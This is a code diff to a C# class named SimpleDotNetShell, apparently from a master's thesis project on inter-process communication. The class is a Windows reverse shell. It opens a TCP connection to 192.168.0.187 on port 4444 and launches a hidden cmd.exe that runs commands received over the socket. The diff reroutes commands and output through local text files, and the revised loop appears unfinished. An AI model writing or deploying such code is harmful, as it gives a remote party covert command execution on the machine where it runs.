@@ -7,52 +7,95 @@ namespace SimpleReverseShell
 {
   public class SimpleDotNetShell
   {
-    private StreamWriter streamWriter;
-
+    FileStream inputStream;
+    StreamWriter outputStreamWriter;
     public void Start()
     {
       using (var client = new TcpClient("192.168.0.187", 4444))
-      using (var stream = client.GetStream())
-      using (var reader = new StreamReader(stream))
+      using (var networkStream = client.GetStream())
+      using (inputStream = new FileStream(@"F:\FH_Technikum_Wien\Masterarbeit\IPC\input.txt", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.Read))
+      using (var outputStream = new FileStream(@"F:\FH_Technikum_Wien\Masterarbeit\IPC\output.txt", FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
+      using (var socketReader = new StreamReader(networkStream))
+      using (var inputStreamWriter = new StreamWriter(inputStream))
+      using (var outputStreamReader = new StreamReader(outputStream))
+      using (outputStreamWriter = new StreamWriter(outputStream))
       {
-        streamWriter = new StreamWriter(stream);
-
-        StringBuilder strInput = new StringBuilder();
-
-        Process p = new Process();
-        p.StartInfo.FileName = "C:\\Windows\\system32\\cmd.exe";
-        p.StartInfo.CreateNoWindow = true;
-        p.StartInfo.UseShellExecute = false;
-        p.StartInfo.RedirectStandardOutput = true;
-        p.StartInfo.RedirectStandardInput = true;
-        p.StartInfo.RedirectStandardError = true;
-        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
-        p.Start();
-        p.BeginOutputReadLine();
+        Task.Run(StartShell);
 
         while (true)
         {
-          strInput.Append(reader.ReadLine());
-          //strInput.Append("\n");
-          p.StandardInput.WriteLine(strInput);
-          strInput.Remove(0, strInput.Length);
+          var shellCommand = socketReader.ReadLine();
+          if (!string.IsNullOrWhiteSpace(shellCommand))
+          {
+            inputStreamWriter.WriteLine(shellCommand);
+            inputStreamWriter.Flush();
+          }
+
+          string formattedOutput = "";
+          string output;
+
+          do
+          {
+            output = outputStreamReader.ReadLine();
+
+            if (!string.IsNullOrWhiteSpace(output))
+              formattedOutput += output;
+          } while (!string.IsNullOrWhiteSpace(output));
         }
       }
     }
 
-    private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+    private void CmdOutputDataHandler(string data)
     {
       StringBuilder strOutput = new StringBuilder();
 
-      if (!String.IsNullOrEmpty(outLine.Data))
+      if (!String.IsNullOrEmpty(data))
       {
         try
         {
-          strOutput.Append(outLine.Data);
-          streamWriter.WriteLine(strOutput);
-          streamWriter.Flush();
+          strOutput.Append(data);
+          outputStreamWriter.WriteLine(strOutput);
+          outputStreamWriter.Flush();
         }
         catch (Exception err) { }
+      }
+    }
+
+    private void StartShell()
+    {
+      Process p = new Process();
+      p.StartInfo.FileName = "C:\\Windows\\system32\\cmd.exe";
+      p.StartInfo.CreateNoWindow = true;
+      p.StartInfo.UseShellExecute = false;
+      p.StartInfo.RedirectStandardOutput = true;
+      p.StartInfo.RedirectStandardInput = true;
+      p.StartInfo.RedirectStandardError = false;
+      p.Start();
+
+      using (var reader = new StreamReader(inputStream))
+      {
+        while (true)
+        {
+          var shellComand = reader.ReadLine();
+
+          if (!string.IsNullOrWhiteSpace(shellComand))
+          {
+            string output;
+            string formattedOutput = string.Empty;
+
+            p.StandardInput.Write(shellComand);
+            do
+            {
+              output = p.StandardOutput.ReadLine();
+
+              if (!string.IsNullOrWhiteSpace(output))
+                formattedOutput += output;
+            }
+            while (!string.IsNullOrWhiteSpace(output));
+
+            CmdOutputDataHandler(formattedOutput);
+          }
+        }
       }
     }
   }
